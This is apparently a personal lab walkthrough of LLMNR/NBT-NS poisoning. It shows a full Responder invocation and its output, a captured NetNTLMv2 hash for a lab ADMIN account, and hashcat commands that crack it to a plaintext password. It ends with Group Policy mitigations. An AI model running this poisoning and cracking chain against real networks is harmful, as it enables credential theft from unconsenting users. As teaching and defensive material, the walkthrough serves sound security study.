![](assets/Pasted%20image%2020241216164444.png)

# [What's LLMNR?]()

**LLMNR** stands for **Link-Local Multicast Name Resolution**. This is used if the DNS is not in use.  It is a protocol used on local networks to resolve the names of computers (hostnames) to their respective IP addresses without requiring a DNS server. LLMNR operates on the local link (Layer 2) and uses multicast communication to perform name resolution. It is primarily used in small networks or environments where a DNS server is unavailable. However LLMNR can pose security risks: It is vulnerable to **man-in-the-middle (MITM)** attacks and spoofing.

# [LLMNR Poisoning]()

In this attacker tricks a computer on a local network into sending sensitive information, like **usernames** and **password hashes**, to the attacker's system instead of the intended destination.

## [How does it work?]()

- Attacker starts responder with below command. Responder listens on client requests and respond saying it has the resource client is asking. 

```
┌─[✗]─[hexadivine@parrot]─[~]
└──╼ $ sudo responder -I wlp0s20f3 -Pwd
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [wlp0s20f3]
    Responder IP               [192.168.0.105]
    Responder IPv6             [fe80::7635:bf9e:3643:497f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-QMUVSR50L9S]
    Responder Domain Name      [UJW2.LOCAL]
    Responder DCE-RPC Port     [46659]

[+] Listening for events...

[*] [DHCP] Found DHCP server IP: 192.168.0.1, now waiting for incoming requests...
```

- **LLMNR request**: When a computer on the network cannot resolve a hostname (e.g., "FileServer") via DNS, it broadcasts an LLMNR request, asking: _"Does anyone here know the IP for 'FileServer'?"_

![](assets/Pasted%20image%2020241216165512.png)

-  **Attacker responds**: An attacker intercepts this request and replies falsely: _"Yes, I am 'FileServer'—here’s my IP address!"_

![](assets/Pasted%20image%2020241216165958.png)

-  **Victim connects**: The victim connects to the attacker's machine, thinking it's the legitimate server.

![](assets/Pasted%20image%2020241216170210.png)

-  **Password hash theft**: During this connection attempt, the victim's computer automatically sends its credentials (in hashed form) to authenticate. The attacker can capture these password hashes and attempt to crack them offline.

![](assets/Pasted%20image%2020241216172637.png)

- **Hash cracking**: `hashcat` is used to crack this hash.

	- Store below hash in a file `/tmp/hash.txt`

	```
	ADMIN::MARVEL:be4eba7f832f0042:0cf0b33bbac6412ad999ccd0c9da00fd:010100000000000000d746edd64fdb01b00f02f131bd6d5b0000000002000800350053003500500001001e00570049004e002d0046004400360045004800460050004e00370045004c0004003400570049004e002d0046004400360045004800460050004e00370045004c002e0035005300350050002e004c004f00430041004c000300140035005300350050002e004c004f00430041004c000500140035005300350050002e004c004f00430041004c000700080000d746edd64fdb0106000400020000000800300030000000000000000100000000200000b0e07a7178edbf77e9f9390d34c3318e86bc82e2b2566f30b833781a1924405b0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0030002e003100300035000000000000000000:Password1
	
	```
	 
	 - Find valid hash mode for hashcat 

	```
	┌─[✗]─[hexadivine@parrot]─[/usr/share/wordlists]
	└──╼ $hashcat --help | grep  ntlm -i
	   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
	  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
	   5600 | NetNTLMv2                                                  | Network Protocol
	  27100 | NetNTLMv2 (NT)                                             | Network Protocol
	   1000 | NTLM                                                       | Operating System
	```

	- Crack the password with the hashcat and a wordlist

```
┌─[hexadivine@parrot]─[~]
└──╼ $hashcat -m 5600 /tmp/a.txt /usr/share/wordlists/rockyou.txt

ADMIN::MARVEL:be4eba7f832f0042:0cf0b33bbac6412ad999ccd0c9da00fd:010100000000000000d746edd64fdb01b00f02f131bd6d5b0000000002000800350053003500500001001e00570049004e002d0046004400360045004800460050004e00370045004c0004003400570049004e002d0046004400360045004800460050004e00370045004c002e0035005300350050002e004c004f00430041004c000300140035005300350050002e004c004f00430041004c000500140035005300350050002e004c004f00430041004c000700080000d746edd64fdb0106000400020000000800300030000000000000000100000000200000b0e07a7178edbf77e9f9390d34c3318e86bc82e2b2566f30b833781a1924405b0a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0030002e003100300035000000000000000000:Password1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ADMIN::MARVEL:be4eba7f832f0042:0cf0b33bbac6412ad999...000000
Time.Started.....: Mon Dec 16 16:33:03 2024 (0 secs)
Time.Estimated...: Mon Dec 16 16:33:03 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   484.4 kH/s (2.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 16384/14344385 (0.11%)
Rejected.........: 0/16384 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> cocoliso
Hardware.Mon.#1..: Temp: 50c Util: 15%

```

# [Mitigation]()

## [Group policy restriction]()

- Follow below steps to create a GPO and turn off multicast name resolution

![](assets/Pasted%20image%2020241216174005.png)
![](assets/Pasted%20image%2020241216174038.png)
![](assets/Pasted%20image%2020241216174131.png)
![](assets/Pasted%20image%2020241216174202.png)
![](assets/Pasted%20image%2020241216174309.png)
![](assets/Pasted%20image%2020241216174339.png)

- Enforce in the end

![](assets/Pasted%20image%2020241216174421.png)

## [Alternative mitigation strategy]()

- Require network access control
- Require strong password. 